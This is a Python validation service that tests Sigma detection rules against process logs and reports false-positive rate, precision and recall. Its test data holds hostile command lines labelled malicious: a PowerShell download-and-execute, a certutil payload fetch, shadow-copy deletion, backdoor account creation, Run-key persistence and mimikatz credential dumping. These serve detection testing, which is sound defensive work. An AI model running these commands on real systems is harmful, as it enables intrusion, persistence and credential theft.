import logging
import re
import os
from typing import Dict, Any, Optional, List, Tuple
import yaml
import pandas as pd
import numpy as np
import httpx
from sklearn.metrics import precision_score, recall_score, f1_score

logger = logging.getLogger("larp.ai.validation")

OLLAMA_URL = os.getenv("OLLAMA_URL", "http://ollama:11434")
VALIDATION_EXPLANATION_MODEL = os.getenv("AI_MODEL", "sec-q6")

# Common column alias mappings: Sigma field name -> DataFrame column
FIELD_ALIASES = {
    "image": "process",
    "processname": "process",
    "process": "process",
    "name": "process",
    "commandline": "cmdline",
    "cmdline": "cmdline",
    "parentimage": "parent",
    "parent": "parent",
    "parent_name": "parent",
    "host": "host",
    "computername": "host",
    "agent_id": "host",
    "timestamp": "timestamp",
    "created_at": "timestamp",
    "destinationip": "dst_ip",
    "dst_ip": "dst_ip",
    "destinationport": "dst_port",
    "dst_port": "dst_port",
}


class ValidationService:
    """
    Agent B: Statistical rule validator (No LLM for metric scoring).
    Parses Sigma rules to pandas boolean masks, evaluates them on historical logs,
    and calculates statistical metrics (FPR, Precision, Recall, F1, Confusion Matrix).
    """

    def __init__(self, ollama_url: str = OLLAMA_URL, model: str = VALIDATION_EXPLANATION_MODEL):
        self.ollama_url = ollama_url
        self.model = model

    async def validate_rule(
        self,
        rule_yaml: str,
        historical_logs_df: Optional[pd.DataFrame] = None,
        ground_truth: Optional[pd.Series] = None,
        fpr_threshold: float = 0.05,
        precision_threshold: float = 0.95,
        db_session = None,
    ) -> Dict[str, Any]:
        """
        Validate a Sigma YAML rule against historical log DataFrame and ground truth.
        Returns evaluation metrics, confusion matrix, and sample FP/FN.
        """
        # If dataframe is not provided, load from DB or benchmark
        if historical_logs_df is None or ground_truth is None:
            historical_logs_df, ground_truth = await self.load_historical_logs(db_session)

        # 1. Parse Sigma YAML
        try:
            sigma_dict = yaml.safe_load(rule_yaml)
            if not isinstance(sigma_dict, dict):
                return {
                    "passed": False,
                    "fpr": 1.0,
                    "precision": 0.0,
                    "recall": 0.0,
                    "f1": 0.0,
                    "confusion": {"tp": 0, "fp": 0, "fn": 0, "tn": 0},
                    "fp_samples": [],
                    "fn_samples": [],
                    "thresholds": {"fpr": fpr_threshold, "precision": precision_threshold},
                    "verdict": "FAILED",
                    "reason": "Invalid YAML content: root must be a mapping",
                }
        except Exception as e:
            return {
                "passed": False,
                "fpr": 1.0,
                "precision": 0.0,
                "recall": 0.0,
                "f1": 0.0,
                "confusion": {"tp": 0, "fp": 0, "fn": 0, "tn": 0},
                "fp_samples": [],
                "fn_samples": [],
                "thresholds": {"fpr": fpr_threshold, "precision": precision_threshold},
                "verdict": "FAILED",
                "reason": f"YAML syntax error: {str(e)}",
            }

        # 2. Extract detection section
        detection = sigma_dict.get("detection")
        if not detection or not isinstance(detection, dict):
            return {
                "passed": False,
                "fpr": 1.0,
                "precision": 0.0,
                "recall": 0.0,
                "f1": 0.0,
                "confusion": {"tp": 0, "fp": 0, "fn": 0, "tn": 0},
                "fp_samples": [],
                "fn_samples": [],
                "thresholds": {"fpr": fpr_threshold, "precision": precision_threshold},
                "verdict": "FAILED",
                "reason": "Missing or invalid 'detection' block in Sigma rule",
            }

        # 3. Compile boolean mask for the detection block
        matched_mask = self._evaluate_detection(detection, historical_logs_df)
        y_pred = matched_mask.astype(int)
        y_true = ground_truth.astype(int)

        # 4. Compute Confusion Matrix and metrics
        tp = int(((y_true == 1) & (y_pred == 1)).sum())
        fp = int(((y_true == 0) & (y_pred == 1)).sum())
        fn = int(((y_true == 1) & (y_pred == 0)).sum())
        tn = int(((y_true == 0) & (y_pred == 0)).sum())

        total_benign = fp + tn
        total_malicious = tp + fn

        fpr = float(fp / total_benign) if total_benign > 0 else 0.0
        precision = float(precision_score(y_true, y_pred, zero_division=0))
        # If no alerts fired at all and zero false positives:
        if (tp + fp) == 0:
            precision = 1.0 if fp == 0 else 0.0

        recall = float(recall_score(y_true, y_pred, zero_division=0))
        f1 = float(f1_score(y_true, y_pred, zero_division=0))

        # 5. Extract FP & FN samples
        fp_samples = self._extract_samples(historical_logs_df, (y_true == 0) & (y_pred == 1), limit=20)
        fn_samples = self._extract_samples(historical_logs_df, (y_true == 1) & (y_pred == 0), limit=20)

        # 6. Evaluation Verdict
        passed = (fpr <= fpr_threshold) and (precision >= precision_threshold)
        verdict = "PASSED" if passed else "FAILED"
        if passed:
            reason = f"Rule passed validation with acceptable FPR ({fpr:.2%}) and Precision ({precision:.2%})."
        else:
            reasons = []
            if fpr > fpr_threshold:
                reasons.append(f"FPR ({fpr:.2%}) exceeds threshold ({fpr_threshold:.2%})")
            if precision < precision_threshold:
                reasons.append(f"Precision ({precision:.2%}) below threshold ({precision_threshold:.2%})")
            reason = "Validation failed: " + "; ".join(reasons)

        result: Dict[str, Any] = {
            "passed": passed,
            "fpr": round(fpr, 4),
            "precision": round(precision, 4),
            "recall": round(recall, 4),
            "f1": round(f1, 4),
            "confusion": {"tp": tp, "fp": fp, "fn": fn, "tn": tn},
            "fp_samples": fp_samples,
            "fn_samples": fn_samples,
            "thresholds": {"fpr": fpr_threshold, "precision": precision_threshold},
            "verdict": verdict,
            "reason": reason,
        }

        # 7. Optional LLM Explanation if FPR exceeds threshold
        if fpr > fpr_threshold and fp_samples:
            try:
                llm_explanation = await self._generate_llm_fp_explanation(rule_yaml, fp_samples[:5], fpr)
                if llm_explanation:
                    result["llm_explanation"] = llm_explanation
            except Exception as e:
                logger.warning(f"Failed to generate LLM explanation for high FPR: {e}")

        return result

    def _evaluate_detection(self, detection: Dict[str, Any], df: pd.DataFrame) -> pd.Series:
        """
        Evaluate all selection/filter blocks in Sigma detection and combine with condition.
        """
        block_masks: Dict[str, pd.Series] = {}
        condition_str = str(detection.get("condition", "selection")).strip()

        for block_name, block_def in detection.items():
            if block_name == "condition":
                continue
            if isinstance(block_def, (dict, list)):
                block_masks[block_name] = self._evaluate_block(block_def, df)
            else:
                block_masks[block_name] = pd.Series(False, index=df.index)

        # If no blocks were defined
        if not block_masks:
            return pd.Series(False, index=df.index)

        # Parse condition
        return self._evaluate_condition(condition_str, block_masks, df.index)

    def _evaluate_block(self, block_def: Any, df: pd.DataFrame) -> pd.Series:
        """
        Evaluate a single selection/filter block.
        If dict: multiple keys are typically AND-ed.
        If list: items are typically OR-ed.
        """
        if isinstance(block_def, list):
            # List of alternatives -> OR combination
            combined = pd.Series(False, index=df.index)
            for sub in block_def:
                sub_mask = self._evaluate_block(sub, df)
                combined = combined | sub_mask
            return combined

        if not isinstance(block_def, dict):
            return pd.Series(False, index=df.index)

        # Dictionary of field criteria -> AND combination
        combined = pd.Series(True, index=df.index)
        for key, value in block_def.items():
            field_mask = self._evaluate_field_criterion(key, value, df)
            combined = combined & field_mask

        return combined

    def _evaluate_field_criterion(self, key: str, value: Any, df: pd.DataFrame) -> pd.Series:
        """
        Evaluate a field criteria with optional modifier:
        e.g., 'CommandLine|contains', 'Image|endswith', 'process|re', 'dst_port'
        """
        parts = key.split("|")
        field_raw = parts[0].strip().lower()
        modifiers = [m.strip().lower() for m in parts[1:]]

        # Resolve column name using FIELD_ALIASES
        target_col = FIELD_ALIASES.get(field_raw, field_raw)
        if target_col not in df.columns:
            # Check case-insensitive column match
            matched = [c for c in df.columns if c.lower() == target_col]
            if matched:
                target_col = matched[0]
            else:
                # Column doesn't exist in historical logs -> returns False
                return pd.Series(False, index=df.index)

        series = df[target_col].fillna("").astype(str)

        # Convert value to list for unified processing (Sigma treats list of values as OR)
        if isinstance(value, (str, int, float, bool)):
            values = [str(value)]
        elif isinstance(value, list):
            values = [str(v) for v in value]
        else:
            return pd.Series(False, index=df.index)

        # Build OR mask across values
        mask = pd.Series(False, index=df.index)
        is_contains = "contains" in modifiers
        is_endswith = "endswith" in modifiers
        is_startswith = "startswith" in modifiers
        is_regex = "re" in modifiers or "regex" in modifiers

        for val in values:
            if is_regex:
                try:
                    sub_mask = series.str.contains(val, regex=True, case=False, na=False)
                except Exception:
                    sub_mask = pd.Series(False, index=df.index)
            elif is_contains:
                sub_mask = series.str.contains(re.escape(val), case=False, na=False)
            elif is_endswith:
                sub_mask = series.str.lower().str.endswith(val.lower())
            elif is_startswith:
                sub_mask = series.str.lower().str.startswith(val.lower())
            else:
                # Exact match (case-insensitive)
                sub_mask = series.str.lower() == val.lower()

            mask = mask | sub_mask

        return mask

    def _evaluate_condition(self, condition_str: str, block_masks: Dict[str, pd.Series], index: pd.Index) -> pd.Series:
        """
        Evaluate condition logic such as 'selection', 'selection and not filter',
        '1 of selection*', 'selection1 or selection2'.
        """
        c = condition_str.strip()

        # Direct block match
        if c in block_masks:
            return block_masks[c]

        # Handle '1 of selection*' or 'all of selection*' or '1 of them'
        if "of selection" in c or "of them" in c:
            masks = [m for name, m in block_masks.items() if not name.startswith("filter")]
            if masks:
                if c.startswith("all of") or c.startswith("all"):
                    res = masks[0].copy()
                    for m in masks[1:]:
                        res = res & m
                    return res
                else:  # 1 of ...
                    res = masks[0].copy()
                    for m in masks[1:]:
                        res = res | m
                    return res

        # Handle 'selection and not filter' / 'selection and not (filter1 or filter2)'
        match_and_not = re.match(r"^(\w+)\s+and\s+not\s+(\w+)$", c, re.IGNORECASE)
        if match_and_not:
            sel_name, filt_name = match_and_not.group(1), match_and_not.group(2)
            sel_mask = block_masks.get(sel_name, pd.Series(False, index=index))
            filt_mask = block_masks.get(filt_name, pd.Series(False, index=index))
            return sel_mask & (~filt_mask)

        # Handle 'A and B'
        match_and = re.match(r"^(\w+)\s+and\s+(\w+)$", c, re.IGNORECASE)
        if match_and:
            a, b = match_and.group(1), match_and.group(2)
            mask_a = block_masks.get(a, pd.Series(False, index=index))
            mask_b = block_masks.get(b, pd.Series(False, index=index))
            return mask_a & mask_b

        # Handle 'A or B'
        match_or = re.match(r"^(\w+)\s+or\s+(\w+)$", c, re.IGNORECASE)
        if match_or:
            a, b = match_or.group(1), match_or.group(2)
            mask_a = block_masks.get(a, pd.Series(False, index=index))
            mask_b = block_masks.get(b, pd.Series(False, index=index))
            return mask_a | mask_b

        # Fallback: if 'selection' is in blocks, use it; otherwise union non-filter blocks
        for name in ["selection", "selection1", "main"]:
            if name in block_masks:
                return block_masks[name]

        non_filters = [m for name, m in block_masks.items() if not name.startswith("filter")]
        if non_filters:
            res = non_filters[0].copy()
            for m in non_filters[1:]:
                res = res | m
            return res

        return pd.Series(False, index=index)

    def _extract_samples(self, df: pd.DataFrame, mask: pd.Series, limit: int = 20) -> List[Dict[str, Any]]:
        """
        Extract up to `limit` sample records for analyst review.
        """
        subset = df[mask].head(limit)
        samples = []
        for _, row in subset.iterrows():
            samples.append({
                "process": str(row.get("process", row.get("name", "N/A"))),
                "cmdline": str(row.get("cmdline", "N/A")),
                "host": str(row.get("host", row.get("agent_id", "N/A"))),
                "timestamp": str(row.get("timestamp", row.get("created_at", "N/A"))),
            })
        return samples

    async def _generate_llm_fp_explanation(
        self, rule_yaml: str, fp_samples: List[Dict[str, Any]], fpr: float
    ) -> Optional[str]:
        """
        Optional Agent B -> Agent A: Call LLM to explain why rule fires FP and suggest exclusions.
        """
        prompt = (
            f"You are a Senior SOC Detection Engineer. The following Sigma rule was tested on historical logs "
            f"and produced an unacceptably high False Positive Rate (FPR: {fpr:.2%}).\n\n"
            f"Sigma Rule:\n```yaml\n{rule_yaml}\n```\n\n"
            f"False Positive Samples from benign environment:\n{fp_samples}\n\n"
            f"Provide a concise analysis (max 3 sentences) explaining why this rule generated false positives, "
            f"and provide a concrete YAML filter block to exclude benign activity."
        )

        payload = {
            "model": self.model,
            "messages": [
                {"role": "system", "content": "You are an expert EDR detection engineer. Be concise and precise."},
                {"role": "user", "content": prompt}
            ],
            "stream": False,
            "options": {"temperature": 0.2, "num_predict": 400}
        }

        async with httpx.AsyncClient(timeout=15.0) as client:
            resp = await client.post(f"{self.ollama_url}/api/chat", json=payload)
            if resp.status_code == 200:
                data = resp.json()
                content = data.get("message", {}).get("content", "")
                # Strip think tags if present
                clean = re.sub(r"<think>.*?</think>", "", content, flags=re.DOTALL).strip()
                return clean or content.strip()
        return None

    async def load_historical_logs(self, db_session=None) -> Tuple[pd.DataFrame, pd.Series]:
        """
        Load historical logs from DB (ProcessInfo) + known threat patterns to form
        a comprehensive evaluation dataset (0 = benign, 1 = malicious).
        """
        benign_rows: List[Dict[str, Any]] = []

        if db_session is not None:
            try:
                from sqlalchemy import select
                from app.models.process_info import ProcessInfo

                stmt = select(ProcessInfo).limit(1000)
                result = await db_session.execute(stmt)
                processes = result.scalars().all()

                for p in processes:
                    benign_rows.append({
                        "process": p.name or "",
                        "cmdline": p.cmdline or "",
                        "host": p.agent_id or "WIN-DEMO",
                        "parent": "",
                        "timestamp": str(p.created_at) if p.created_at else "2026-11-15T10:00:00Z",
                        "is_malicious": 1 if p.is_suspicious else 0
                    })
            except Exception as e:
                logger.warning(f"Failed to query process_info from DB: {e}")

        # If DB had few or no records, supplement with realistic baseline logs
        if len(benign_rows) < 50:
            synthetic_benign = [
                {"process": "explorer.exe", "cmdline": "C:\\Windows\\Explorer.EXE", "host": "WIN-DEMO-01", "parent": "userinit.exe", "timestamp": "2026-11-15T09:00:00Z", "is_malicious": 0},
                {"process": "svchost.exe", "cmdline": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p", "host": "WIN-DEMO-01", "parent": "services.exe", "timestamp": "2026-11-15T09:01:00Z", "is_malicious": 0},
                {"process": "chrome.exe", "cmdline": "\"C:\\Program Files\\Google\\Chrome\\chrome.exe\" --type=renderer", "host": "WIN-DEMO-01", "parent": "chrome.exe", "timestamp": "2026-11-15T09:02:00Z", "is_malicious": 0},
                {"process": "python.exe", "cmdline": "python.exe C:\\larp\\agent\\win_agent_minimal.py", "host": "WIN-DEMO-01", "parent": "cmd.exe", "timestamp": "2026-11-15T09:03:00Z", "is_malicious": 0},
                {"process": "powershell.exe", "cmdline": "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1", "host": "WIN-DEMO-01", "parent": "taskeng.exe", "timestamp": "2026-11-15T09:04:00Z", "is_malicious": 0},
                {"process": "cmd.exe", "cmdline": "cmd.exe /c echo %PATH%", "host": "WIN-DEMO-02", "parent": "explorer.exe", "timestamp": "2026-11-15T09:05:00Z", "is_malicious": 0},
                {"process": "conhost.exe", "cmdline": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1", "host": "WIN-DEMO-02", "parent": "cmd.exe", "timestamp": "2026-11-15T09:06:00Z", "is_malicious": 0},
                {"process": "code.exe", "cmdline": "\"C:\\Users\\dev\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe\"", "host": "WIN-DEMO-02", "parent": "explorer.exe", "timestamp": "2026-11-15T09:07:00Z", "is_malicious": 0},
                {"process": "nginx.exe", "cmdline": "nginx -g \"daemon off;\"", "host": "LINUX-AGENT", "parent": "systemd", "timestamp": "2026-11-15T09:08:00Z", "is_malicious": 0},
                {"process": "bash", "cmdline": "/bin/bash /usr/local/bin/healthcheck.sh", "host": "LINUX-AGENT", "parent": "cron", "timestamp": "2026-11-15T09:09:00Z", "is_malicious": 0},
            ]
            benign_rows.extend(synthetic_benign)

        # Realistic malicious dataset for true positive measurement
        malicious_rows = [
            {"process": "powershell.exe", "cmdline": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA=", "host": "ATTACK-VICTIM", "parent": "word.exe", "timestamp": "2026-11-15T11:00:00Z", "is_malicious": 1},
            {"process": "powershell.exe", "cmdline": "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.30.104/rev.ps1')", "host": "ATTACK-VICTIM", "parent": "excel.exe", "timestamp": "2026-11-15T11:01:00Z", "is_malicious": 1},
            {"process": "vssadmin.exe", "cmdline": "vssadmin.exe delete shadows /all /quiet", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:02:00Z", "is_malicious": 1},
            {"process": "wmic.exe", "cmdline": "wmic shadowcopy delete /nointeractive", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:03:00Z", "is_malicious": 1},
            {"process": "certutil.exe", "cmdline": "certutil.exe -urlcache -split -f http://malicious.cdn/payload.exe payload.exe", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:04:00Z", "is_malicious": 1},
            {"process": "net.exe", "cmdline": "net user backdoor P@ssw0rd123! /add", "host": "ATTACK-VICTIM", "parent": "powershell.exe", "timestamp": "2026-11-15T11:05:00Z", "is_malicious": 1},
            {"process": "reg.exe", "cmdline": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\bad.exe", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:06:00Z", "is_malicious": 1},
            {"process": "mimikatz.exe", "cmdline": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:07:00Z", "is_malicious": 1},
            {"process": "rundll32.exe", "cmdline": "rundll32.exe C:\\temp\\malicious.dll,EntryPoint", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:08:00Z", "is_malicious": 1},
            {"process": "whoami.exe", "cmdline": "whoami /priv", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:09:00Z", "is_malicious": 1},
        ]

        all_rows = benign_rows + malicious_rows
        df = pd.DataFrame(all_rows)
        ground_truth = df["is_malicious"].astype(int)

        return df, ground_truth


validation_service = ValidationService()

